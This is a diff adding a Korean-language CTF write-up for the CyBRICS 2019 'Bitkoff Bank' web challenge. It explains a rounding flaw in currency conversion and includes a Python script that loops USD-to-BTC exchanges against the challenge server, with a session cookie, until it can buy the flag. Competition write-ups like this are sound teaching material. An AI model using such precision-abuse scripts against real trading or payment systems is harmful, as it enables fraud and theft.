@@ -1,5 +1,5 @@
 # CyBRICS CTF 2019
-with team `ROKA`. (198 / 775)  
+with team `ROKA`. (198 / 1188)  
 [Mic Check (Cyber, Baby, 10 pts)](#mic-check-cyber-baby-10-pts)  
 [Caesaref (Web, Hard, 50 pts)](#caesaref-web-hard-50-pts)  
 [Oldman Reverse (Reverse, Baby, 10 pts)](#oldman-reverse-reverse-baby-10-pts)  
@@ -438,3 +438,90 @@ Choose what you want to do(store, retreive):
 ```
 flag : `cybrics{0dbceabb65128d70f92b70f9d63f277ceac7515c501ece4916d0f3aa65457872}`
 
+# Bitkoff Bank (Web, Easy, 50 pts)
+
+> Need more money! Need the flag!  
+> http://45.77.201.191/index.php  
+> Mirror: http://95.179.148.72:8083/index.php  
+
+사이트에 들어가면 5가지 행동을 할 수 있다. `채굴`, `자동채굴기 구입`, `flag 구입`, `매수`, `매도`가 있다. 채굴과 같은 방법을 통해 USD 1$를 만들어서 flag를 구입해야하는데, 자동 채굴은 답도 없이 느리다. 이것저것 해보면 알게되겠지만 매수와 매도를 할 때, 소수점 관리가 잘 되지 않아서 차이가 발생한다. 이 차이는 `채굴` 기능을 이용할 때보다 더 큰 이익을 얻을 수 있다. 이를 이용해서 아래와 같이 또다른 개념의 채굴을 하는 코드를 작성했다.
+``` python
+import requests
+
+url = "http://95.179.148.72:8083/index.php"
+cookie = {
+        'name' : 'tori',
+        'password' : 'tori',
+        'session' : 'c54515c3-0775-41c6-bd03-3fb892e3b3c9'
+}
+data = {}
+
+def usd2btc(usd):
+    data['from_currency'] = 'usd'
+    data['to_currency'] = 'btc'
+    data['amount'] = usd
+    return run()
+
+def btc2usd(btc):
+    data['from_currency'] = 'btc'
+    data['to_currency'] = 'usd'
+    data['amount'] = btc
+    return run()
+
+def run():
+    return requests.post(url, data=data, cookies=cookie)
+
+def getWallet():
+    global data
+    wallet = { 'btc':0, 'usd':0 }
+    data = {}
+    content = run().text
+    s = content.index('Your BTC')
+    d = content[s:].index('</b>')
+    wallet['btc'] = float(content[s+13:s + d])
+    s = content.index('Your USD')
+    d = content[s:].index('</b>')
+    wallet['usd'] = float(content[s+13:s + d])
+    return wallet
+
+def getFlag():
+    global data
+    data = { 'flag' : 1 }
+    return run()
+
+if __name__ == '__main__':
+    while True:
+        wallet = getWallet()
+        if wallet['usd'] > 1:
+            print("[*] Get 1$")
+            flag = getFlag().text
+            s = flag.index('cybrics{')
+            d = s + flag[s:].index('}') + 1
+            flag = flag[s:d]
+            print(flag)
+            break
+        else :
+            print("USD : "+str(wallet['usd']))
+        usd2btc(wallet['usd'])
+        wallet = getWallet()
+        btc2usd(wallet['btc'])
+```
+실행하면 아래와 같이 플래그를 얻을 수 있다.
+```bash
+root@raspberrypi:~# python bitkoff.py 
+
+(...)
+
+USD : 0.970851
+USD : 0.97407
+USD : 0.977299
+USD : 0.980539
+USD : 0.98379
+USD : 0.987052
+USD : 0.990324
+USD : 0.993607
+USD : 0.9969
+[*] Get 1$
+cybrics{50_57R4n93_pR3c1510n}
+```
+flag: `cybrics{50_57R4n93_pR3c1510n}`
